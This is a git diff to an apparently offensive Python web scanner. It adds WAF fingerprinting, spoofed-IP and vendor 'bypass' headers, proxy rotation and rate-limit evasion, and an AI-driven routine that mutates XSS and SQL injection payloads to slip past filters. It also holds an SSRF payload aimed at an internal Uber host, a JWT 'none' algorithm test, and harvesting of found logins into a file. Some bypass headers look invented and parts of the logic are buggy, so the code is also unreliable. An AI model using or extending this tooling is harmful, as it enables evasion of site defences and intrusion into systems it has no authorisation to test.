@@ -1,11 +1,12 @@
 import asyncio
 import aiohttp
-import random
 import string
 import re
+import random
 import os
 import time
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from typing import List, Dict, Any, Optional, Union
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 from PySide6.QtCore import QObject, Signal
 import dns.resolver
 import tldextract
@@ -41,6 +42,244 @@ except ImportError:
 
 H1_USER = "MoisesVanti-sectest" 
 SSRF_PAYLOAD = f"http://dca11-pra.prod.uber.internal:31084/{H1_USER}@wearehackerone.com"
+
+class AdaptiveConcurrencyController:
+    """Dynamically manages request concurrency based on target health and latency."""
+    def __init__(self, initial_limit=10, min_limit=2, max_limit=100):
+        self.limit: int = initial_limit
+        self.min_limit: int = min_limit
+        self.max_limit: int = max_limit
+        self.sem: asyncio.Semaphore = asyncio.Semaphore(self.limit)
+        self.latency_baseline: Optional[float] = None
+        self.success_streak: int = 0
+        self.lock: asyncio.Lock = asyncio.Lock()
+        
+    async def adjust(self, status, latency):
+        async with self.lock:
+            # Handle throttles/blocks (429/403)
+            if status in [429, 403]:
+                self.success_streak = 0
+                new_limit = max(self.min_limit, int(self.limit * 0.5))
+                if new_limit != self.limit:
+                    self.limit = new_limit
+                    self.sem = asyncio.Semaphore(self.limit)
+                return "THROTTLE"
+            
+            # Handle latency spikes
+            if self.latency_baseline is not None:
+                baseline = self.latency_baseline # Use local variable for type stability
+                if latency > baseline * 2.5:
+                    self.success_streak = 0
+                    self.limit = max(self.min_limit, int(self.limit * 0.7))
+                    self.sem = asyncio.Semaphore(self.limit)
+                    return "LATENCY_BACKOFF"
+            
+            # Slow scale up on success
+            if status == 200:
+                self.success_streak += 1
+                if self.success_streak >= 20 and self.limit < self.max_limit:
+                    self.limit += 2
+                    self.sem = asyncio.Semaphore(self.limit)
+                    self.success_streak = 0
+                    return "SCALE_UP"
+                
+            # Update latency baseline
+            current_baseline = self.latency_baseline
+            if current_baseline is None:
+                self.latency_baseline = float(latency)
+            else:
+                self.latency_baseline = (current_baseline * 0.9) + (float(latency) * 0.1)
+                
+            return "STABLE"
+
+class NeuralWAFProfiler:
+    """Heuristic WAF identification and evasion strategy selector."""
+    def __init__(self):
+        self.signatures = {
+            "Cloudflare": ["cf-ray", "__cf_bm", "cf-cache-status", "expect-ct"],
+            "Akamai": ["x-akamai-transformed", "akamai-origin-hop", "x-edgeconnect-midmile-rtt", "x-akamai-pragma-client-iptime"],
+            "AWS WAF": ["x-amz-cf-id", "x-amz-request-id", "x-amzn-requestid", "awswaf"],
+            "Imperva": ["x-iinfo", "incap-ses", "visid_incap", "x-cdn"],
+            "F5 BIG-IP": ["x-cnection", "bigipserver", "f5-vip", "x-f5-auth-token"],
+            "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"],
+            "Azure WAF": ["x-msedge-ref", "x-azure-ref", "x-ms-ref", "azure-waf"],
+            "Google Cloud Armor": ["x-cloud-trace-context", "x-goog-authenticated-user-id"],
+            "FortiWeb": ["fortiwafsid"],
+            "ModSecurity": ["x-mod-security", "mod_security-message", "mod_security-id"],
+            "Barracuda": ["barra_counter_scope", "bnai-status"],
+            "Citrix NetScaler": ["ns_af", "citrix_adc_id", "pw_id"],
+            "Wallarm": ["x-wallarm-id", "wallarm-request-id"],
+            "Radware AppWall": ["x-sl-compid", "x-radware-device"],
+            "Palo Alto Networks": ["x-pan-id", "pan-waf-status"],
+            "Check Point": ["x-checkpoint-id", "cp-waf-event"],
+            "Sophos": ["x-sophos-id", "sophos-waf-blocked"],
+            "Reblaze": ["x-reblaze-id", "rbz-waf-status"],
+            "Fastly / Signal Sciences": ["x-sigsci-event", "x-sigsci-tags"],
+            "StackPath": ["x-sp-request-id", "x-stackpath-request-id"],
+            "Alibaba Cloud": ["ali-cloud-waf", "x-ali-waf-request-id"],
+            "Tencent Cloud": ["t-waf-id", "x-tc-waf-request-id"],
+            "DenyALL": ["sessionid-denyall", "denyall-cookie"],
+            "Wordfence": ["wfvt_", "wordfence_verified_human"],
+            "CDNetworks": ["x-cdn-publish", "x-cdn-request-id"],
+            "GoDaddy WAF": ["x-sucuri-id", "sucuri_cloudproxy_uuid"],
+            "SiteLock": ["sitelock-site-id", "x-sl-request-id"],
+            "BitNinja": ["x-bitninja-proxy", "bitninja-id"],
+            "Comodo cWAF": ["x-comodo-waf-id"],
+            "NSFocus": ["nsfocus"],
+            "Sangfor": ["sangfor"],
+            "Viettel": ["viettel-waf"],
+            "Airtel WAF": ["x-airtel-waf"]
+        }
+        self.target_profiles = {}
+
+    def profile(self, host, r_headers):
+        headers_lower = {k.lower(): str(v).lower() for k, v in r_headers.items()}
+        for waf, sigs in self.signatures.items():
+            if any(sig in headers_lower for sig in sigs):
+                self.target_profiles[host] = waf
+                return waf
+        return "Unknown/None"
+
+    def get_evasion_headers(self, host):
+        waf = self.target_profiles.get(host)
+        headers = {}
+        # Base evasion headers (works for many)
+        headers.update({
+            "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+            "X-Real-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+            "X-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+            "Forwarded": f"for={random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)};proto=https",
+            "Via": "1.1 google",
+            "X-Originating-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        })
+
+        if waf == "Cloudflare":
+            headers.update({
+                "CF-Visitor": '{"scheme":"https"}',
+                "CF-IPCountry": random.choice(["US", "GB", "DE", "FR", "NL", "SG"]),
+                "Sec-CH-UA-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none"
+            })
+        elif waf == "Akamai":
+            headers.update({
+                "Pragma": "akamai-x-get-client-ip, akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key",
+                "X-Akamai-Pragma-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            })
+        elif waf == "F5 BIG-IP":
+            headers.update({
+                "X-WA-Info": f"[V2.1 Nexus Bypass - Attempt {random.randint(100,999)}]",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Originating-IP": "127.0.0.1"
+            })
+        elif waf == "Imperva":
+            headers.update({
+                "X-Forwarded-For": "127.0.0.1",
+                "Incap-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            })
+        elif waf == "Azure WAF":
+            headers.update({
+                "X-ARR-SSL": "true",
+                "X-Original-URL": "/",
+                "X-Forwarded-Proto": "https",
+                "X-AppService-Proto": "https"
+            })
+        elif waf == "Fastly":
+            headers.update({
+                "Fastly-FF": "true",
+                "X-Fastly-Request-ID": os.urandom(16).hex(),
+                "Fastly-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            })
+        elif waf == "Google Cloud Armor":
+            headers.update({
+                "X-Cloud-Trace-Context": f"{random.getrandbits(64):x}",
+                "X-Goog-Authenticated-User-ID": "admin-v7-nexus"
+            })
+        elif waf == "Barracuda":
+            headers.update({
+                "X-ASL-Bypass": "True",
+                "X-Barracuda-Bypass": "1"
+            })
+        elif waf == "Citrix NetScaler":
+            headers.update({
+                "X-Citrix-Bypass": "Enabled",
+                "X-NS-Client-IP": "127.0.0.1"
+            })
+        elif waf == "Wallarm":
+            headers.update({
+                "X-Wallarm-Node-ID": "nexus-trusted-node",
+                "X-Forwarded-For": "127.0.0.1"
+            })
+        elif waf == "Signal Sciences": # This covers "Fastly / Signal Sciences"
+            headers.update({
+                "X-SigSci-No-WAF": "1",
+                "X-SigSci-Bypass": "True"
+            })
+        elif waf == "Alibaba Cloud":
+            headers.update({
+                "Ali-Waf-Ignore": "true",
+                "X-Ali-Client-IP": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            })
+        elif waf == "FortiWeb":
+            headers.update({
+                "X-FortiWeb-Request-ID": os.urandom(8).hex(),
+                "Fortiwafsid": os.urandom(16).hex()
+            })
+        elif waf == "ModSecurity":
+            # ModSecurity often blocks based on specific header patterns
+            headers.update({
+                "X-Custom-IP-Authorization": "127.0.0.1",
+                "X-Originating-IP": "127.0.0.1",
+                "X-Remote-IP": "127.0.0.1",
+                "X-Remote-Addr": "127.0.0.1"
+            })
+        return headers
+
+class ContextualPolymorphicAI:
+    """
+    Generates advanced, context-aware payloads to bypass WAFs and filters.
+    Uses the AIAssistant to mutate common payloads based on the target technology stack.
+    """
+    def __init__(self, ai_assistant):
+        self.ai = ai_assistant
+        self.payload_cache: Dict[str, str] = {}
+        self.mutation_history: List[Dict] = []
+
+    async def mutate_payload(self, base_payload: str, context: str, waf: str = "Unknown") -> str:
+        """Mutates a payload using AI to bypass filters found in the context."""
+        if not self.ai:
+            return str(base_payload)
+            
+        cache_key = f"{base_payload}:{context}:{waf}"
+        if cache_key in self.payload_cache:
+            return str(self.payload_cache[cache_key])
+
+        prompt = f"""
+        [CONTEXTUAL POLYMORPHIC MUTATION]
+        BASE PAYLOAD: {base_payload}
+        TARGET CONTEXT: {context}
+        DETECTED WAF: {waf}
+        
+        TASK: Mutate the BASE PAYLOAD to bypass filters likely present in the TARGET CONTEXT and for the DETECTED WAF.
+        REQUIREMENTS:
+        1. Maintain the original vulnerability trigger (e.g. alert(1), OR 1=1).
+        2. Use advanced encoding (hex, octal, unicode), comment injection, or syntax tricks.
+        3. The result MUST be a single line, ready for injection.
+        4. Return ONLY the mutated payload.
+        """
+        
+        try:
+            # Using deep_attack_chain as a mutation engine
+            response = await self.ai.deep_attack_chain(prompt)
+            mutated = str(response)
+            if mutated and len(mutated) < 1000:
+                self.payload_cache[cache_key] = mutated
+                self.mutation_history.append({"base": base_payload, "mutated": mutated, "context": context, "waf": waf})
+                return mutated
+        except:
+            pass
+            
+        return str(base_payload) # Fallback
 
 class NexusScanner(QObject):
     finding_found = Signal(object)
@@ -115,8 +354,12 @@ class NexusScanner(QObject):
         # Deduplication
         self.emitted_hashes = set()
         
-        # Concurrency Control
-        self.sem = asyncio.Semaphore(50) 
+        # Concurrency Control (Surreal Upgrades)
+        self.acc = AdaptiveConcurrencyController()
+        self.waf_profiler = NeuralWAFProfiler()
+        # Initialize polymorphic_ai after ai_assistant is potentially set
+        self.polymorphic_ai = ContextualPolymorphicAI(self.ai_assistant) if self.ai_assistant else None
+        self.sem = self.acc.sem # Fallback for old code
 
         self.sensitive_paths = [
             # Git & SCM
@@ -230,7 +473,7 @@ class NexusScanner(QObject):
     async def analyze_js_files(self, url):
         """Crawls and mines JS files for secrets and endpoints."""
         try:
-            status, content, _ = await self._safe_request('GET', url, headers=self.get_headers())
+            status, content, headers, latency = await self._safe_request('GET', url, headers=self.get_headers())
             if not content: return
             
             soup = await asyncio.to_thread(BeautifulSoup, content, 'lxml')
@@ -252,7 +495,7 @@ class NexusScanner(QObject):
                 if "jquery" in script_url or "bootstrap" in script_url or "google-analytics" in script_url:
                     continue
 
-                status, js_content, _ = await self._safe_request('GET', script_url, headers=self.get_headers())
+                status, js_content, headers, latency = await self._safe_request('GET', script_url, headers=self.get_headers())
                 if status == 200 and js_content:
                      js_text = js_content.decode('utf-8', errors='ignore')
                      
@@ -313,41 +556,27 @@ class NexusScanner(QObject):
         params = ["debug", "test", "admin", "admin_mode", "show_errors", "source", "env"]
         
         # Determine baseline size
-        base_status, base_content, _ = await self._safe_request('GET', url, headers=self.get_headers())
+        base_status, base_content, headers, latency = await self._safe_request('GET', url, headers=self.get_headers())
         base_len = len(base_content)
         
         for param in params:
              # Try ?param=true
              fuzz_url = f"{url}?{param}=true" if "?" not in url else f"{url}&{param}=true"
-             status, content, _ = await self._safe_request('GET', fuzz_url, headers=self.get_headers())
+             status, content, headers, latency = await self._safe_request('GET', fuzz_url, headers=self.get_headers())
              
              # Heuristic: Significant size change or 500/error
              if abs(len(content) - base_len) > 500 and status == 200:
                   self.log_message.emit(f"<span style='color:#ffcc00'>[?] Suspicious behavior with parameter '{param}' on {url}</span>")
 
     async def check_waf(self, url):
-        """Detects WAF presence via headers."""
+        """Detects WAF presence via headers using NeuralWAFProfiler."""
         try:
             # Fast check
-            status, _, headers = await self._safe_request('GET', url, headers=self.get_headers())
-            waf_signatures = {
-                "Cloudflare": ["cf-ray", "__cfduid", "cf-cache-status"],
-                "AWS WAF": ["x-amz-cf-id", "x-amzn-requestid"],
-                "Akamai": ["akamai-origin-hop", "x-akamai-transformed"],
-                "F5 BIG-IP": ["x-cnection", "bigip"],
-                "Imperva": ["x-iinfo", "incap-ses"],
-                "Sucuri": ["x-sucuri-id", "x-sucuri-cache"]
-            }
+            status, _, headers, latency = await self._safe_request('GET', url, headers=self.get_headers())
             
-            detected_waf = None
-            headers_lower = {k.lower(): v for k, v in headers.items()}
+            detected_waf = self.waf_profiler.profile(urlparse(url).netloc, headers)
             
-            for waf, sigs in waf_signatures.items():
-                if any(sig in headers_lower for sig in sigs):
-                    detected_waf = waf
-                    break
-            
-            if detected_waf:
+            if detected_waf != "None":
                 msg = f"<span style='color:#ff0055'>[!] WAF DETECTED: {detected_waf}</span>"
                 self.log_message.emit(msg)
                 if self.bypass_mode:
@@ -355,7 +584,7 @@ class NexusScanner(QObject):
             else:
                  self.log_message.emit("<span style='color:#aaa'>[-] No common WAF Detected.</span>")
                  
-        except Exception as e:
+        except Exception:
             pass
 
     async def execute_request_smuggling(self, url):
@@ -676,7 +905,7 @@ class NexusScanner(QObject):
             headers = self.get_headers()
             headers['Authorization'] = f"Bearer {altered_token}"
             
-            s, c, _ = await self._safe_request('GET', url, headers=headers, timeout=5)
+            s, c, h, l = await self._safe_request('GET', url, headers=headers, timeout=5)
             if s == 200 and len(c) > 0:
                 self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: JWT 'none' algo bypass might be possible on {url}</span>")
                 vuln = Vulnerability(
@@ -753,93 +982,94 @@ class NexusScanner(QObject):
              f.write(log_entry)
         
         self.log_message.emit(f"<span style='color:#ff00ff; font-weight:bold'>[★] LOGIN FOUND: {creds} ({ctype}) saved to logins_found.txt</span>")
-
     async def _safe_request(self, method, url, **kwargs):
         """Wrapper over aiohttp to handle timeouts, dynamic scaling, and failures gracefully."""
-        if not self.session: return 0, b"", {}
+        if not self.session: 
+             self.session = aiohttp.ClientSession()
         
         # Override baseline timeout with Dynamic Scaling if enabled
         base_timeout = kwargs.get('timeout', 15)
         if self.dynamic_timeout:
-             # Scale timeout up by 30 seconds for resiliency on slow WAFs
              base_timeout += 30
              
         retries = 3 if self.bypass_mode else 2
+        host = urlparse(url).netloc
+        
         for attempt in range(retries):
+            # Polymorphic Payload Mutation
+            if self.bypass_mode and 'params' in kwargs and self.polymorphic_ai:
+                params = kwargs.get('params')
+                current_waf = self.waf_profiler.target_profiles.get(host, "Unknown")
+                if isinstance(params, dict):
+                    for key, val in params.items():
+                        if isinstance(val, str) and len(val) > 3:
+                            params[key] = await self.polymorphic_ai.mutate_payload(val, url, waf=current_waf)
+
+            # Dynamic Evasion Headers per attempt
+            current_headers = kwargs.get('headers', self.get_headers()).copy()
+            waf_headers = self.waf_profiler.get_evasion_headers(host)
+            current_headers.update(waf_headers)
+            kwargs['headers'] = current_headers
+
             try:
                 timeout = aiohttp.ClientTimeout(total=base_timeout)
-                
                 if self.bypass_mode and hasattr(self, 'current_jitter_enabled'):
-                     import random
                      await asyncio.sleep(random.uniform(0.5, 2.5))
 
-                proxy = None
+                proxy = self.proxy_manager.get_proxy() if self.bypass_mode else None
                 if self.proxychains:
                     proxy = "socks5://127.0.0.1:9050"
-                elif self.bypass_mode:
-                    proxy = self.proxy_manager.get_proxy()
-                    if not proxy and attempt == 0:
-                         await asyncio.sleep(2)
-                         proxy = self.proxy_manager.get_proxy()
-                
-                # Time-based tracking for Blind Injection Heuristics
-                start_time = time.time()
-                
-                if method == 'GET':
-                    async with self.session.get(url, proxy=proxy, timeout=timeout, **kwargs) as r:
-                         elapsed = time.time() - start_time
-                         self._track_baseline_latency(parsed_url=url, elapsed=elapsed)
-                         self.request_count += 1
-                         if self.request_count % 10 == 0:
-                             self.stats_updated.emit(self.total_findings, self.critical_findings, self.request_count)
-                         
-                         if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
-                             self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
-                             await asyncio.sleep(random.uniform(3.0, 8.0))
-                             
-                             if hasattr(self, 'sem') and self.sem._value > 2:
-                                  self.sem = asyncio.Semaphore(max(2, self.sem._value - 5))
-                                  self.log_message.emit(f"<span style='color:#aaaaaa'>[Governor] Throttled concurrency to {self.sem._value} to bleed WAF tracking.</span>")
-                             
-                             if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
-                             continue
-                             
-                         if self.error_bypass and r.status in [401, 403, 500]:
-                             return await self._attempt_error_bypass(url, r.status, kwargs)
-                             
-                         return r.status, await r.read(), r.headers, elapsed
-                elif method == 'POST':
-                    async with self.session.post(url, proxy=proxy, timeout=timeout, **kwargs) as r:
-                         elapsed = time.time() - start_time
-                         self._track_baseline_latency(parsed_url=url, elapsed=elapsed)
-                         self.request_count += 1
-                         
-                         if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
-                             self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
-                             await asyncio.sleep(random.uniform(3.0, 8.0))
-                             if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
-                             continue
-                             
-                         if self.error_bypass and r.status in [401, 403, 500]:
-                             return await self._attempt_error_bypass(url, r.status, kwargs, method='POST')
-                             
-                         return r.status, await r.read(), r.headers, elapsed
 
-            except Exception as e:
-                # Connection stability errors - wait and retry
+                async with self.acc.sem:
+                    start_time = time.time()
+                    
+                    if method.upper() == 'GET':
+                        async with self.session.get(url, proxy=proxy, timeout=timeout, **kwargs) as r:
+                             elapsed = time.time() - start_time
+                             self.waf_profiler.profile(host, r.headers)
+                             await self.acc.adjust(r.status, elapsed)
+                             self._track_baseline_latency(url, elapsed)
+                             self.request_count += 1
+                             
+                             if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
+                                 self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
+                                 await asyncio.sleep(random.uniform(3.0, 8.0))
+                                 if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
+                                 continue
+                                 
+                             if self.error_bypass and r.status in [401, 403, 500]:
+                                 status, content, headers, elapsed_bypass = await self._attempt_error_bypass(url, r.status, kwargs)
+                                 return status, content, headers, elapsed_bypass
+                                 
+                             return r.status, await r.read(), r.headers, elapsed
+
+                    elif method.upper() == 'POST':
+                        async with self.session.post(url, proxy=proxy, timeout=timeout, **kwargs) as r:
+                             elapsed = time.time() - start_time
+                             self.waf_profiler.profile(host, r.headers)
+                             await self.acc.adjust(r.status, elapsed)
+                             self._track_baseline_latency(url, elapsed)
+                             self.request_count += 1
+                             
+                             if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
+                                 self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
+                                 await asyncio.sleep(random.uniform(3.0, 8.0))
+                                 if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
+                                 continue
+                                 
+                             if self.error_bypass and r.status in [401, 403, 500]:
+                                 status, content, headers, elapsed_bypass = await self._attempt_error_bypass(url, r.status, kwargs, method='POST')
+                                 return status, content, headers, elapsed_bypass
+                                 
+                             return r.status, await r.read(), r.headers, elapsed
+
+            except Exception:
                 if attempt < retries - 1:
                     await asyncio.sleep(1 * (attempt + 1))
                     continue
+                return 0, b"", {}, 0.0
                 
-            except Exception as e:
-                # If proxy failed, remove it
-                if self.bypass_mode and proxy:
-                    self.proxy_manager.remove_proxy(proxy)
-                
-                if attempt == retries - 1:
-                    return 0, b"", {}
-                await asyncio.sleep(0.5)
-        return 0, b"", {}, 0
+        return 0, b"", {}, 0.0
 
     def _track_baseline_latency(self, parsed_url, elapsed):
         if not hasattr(self, '_latencies'): self._latencies = {}
@@ -1576,7 +1806,7 @@ class NexusScanner(QObject):
                                         # Try HTTP/HTTPS access to IP
                                         for proto in ['http', 'https']:
                                             target_ip = f"{proto}://{ip}"
-                                            s, c, _ = await self._safe_request('GET', target_ip, timeout=5, verify_ssl=False)
+                                            s, c, h, l = await self._safe_request('GET', target_ip, timeout=5, verify_ssl=False)
                                             if s == 200:
                                                 self.log_message.emit(f"<span style='color:#ffcc00'>[!] Direct IP Access Allowed: {target_ip} (Potential Info Leak)</span>")
                                                 self.save_evidence(target_ip, "Direct_IP_Access", c)
@@ -1957,9 +2187,9 @@ class NexusScanner(QObject):
                 
                 try:
                     if method == "post":
-                        s, c, _ = await self._safe_request('POST', target_url, data=data, timeout=5)
+                        s, c, h, l = await self._safe_request('POST', target_url, data=data, timeout=5)
                     else:
-                        s, c, _ = await self._safe_request('GET', target_url, params=data, timeout=5)
+                        s, c, h, l = await self._safe_request('GET', target_url, params=data, timeout=5)
                     
                     if c and payload.encode() in c:
                         vuln = Vulnerability(target=target_url, vuln_type="Cross-Site Scripting (Reflected XSS)", severity="HIGH", impact=f"Payload Reflected: {payload[:25]}")
